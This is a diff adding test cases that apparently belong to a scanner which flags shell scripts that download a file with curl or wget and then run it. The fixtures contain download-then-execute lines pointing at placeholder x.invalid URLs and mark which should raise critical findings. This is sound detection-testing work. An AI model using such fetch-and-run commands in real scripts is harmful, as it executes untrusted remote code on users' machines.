@@ -207,6 +207,20 @@ export default [
     fire: [{ severity: "critical", line: 2 }],
   },
   {
+    name: "curl -O on the second of two URLs, then the second one run",
+    path: "scripts/setup.sh",
+    content:
+      "#!/bin/sh\ncurl -o notes.txt https://x.invalid/a.txt -O https://x.invalid/run.sh\nbash run.sh\n",
+    fire: [{ severity: "critical", line: 2 }],
+  },
+  {
+    name: "curl --remote-name-all saves every URL under its own name, then run",
+    path: "scripts/setup.sh",
+    content:
+      "#!/bin/sh\ncurl --remote-name-all https://x.invalid/a.txt https://x.invalid/run.sh\nbash run.sh\n",
+    fire: [{ severity: "critical", line: 2 }],
+  },
+  {
     name: "a remote file name saved by bare wget, then run",
     path: "scripts/setup.sh",
     content: "#!/bin/sh\nwget https://x.invalid/install.sh\nbash install.sh\n",
@@ -321,6 +335,13 @@ export default [
     name: "curl -o under another name, then a local script that shares the remote name",
     path: "scripts/setup.sh",
     content: "#!/bin/sh\ncurl -o notes.txt https://x.invalid/install.sh\nbash install.sh\n",
+    silent: "none",
+  },
+  {
+    name: "curl -o for the first URL and -O for the second, then a local script named like the first",
+    path: "scripts/setup.sh",
+    content:
+      "#!/bin/sh\ncurl -o notes.txt https://x.invalid/report.sh -O https://x.invalid/appendix.txt\nbash report.sh\n",
     silent: "none",
   },
   {
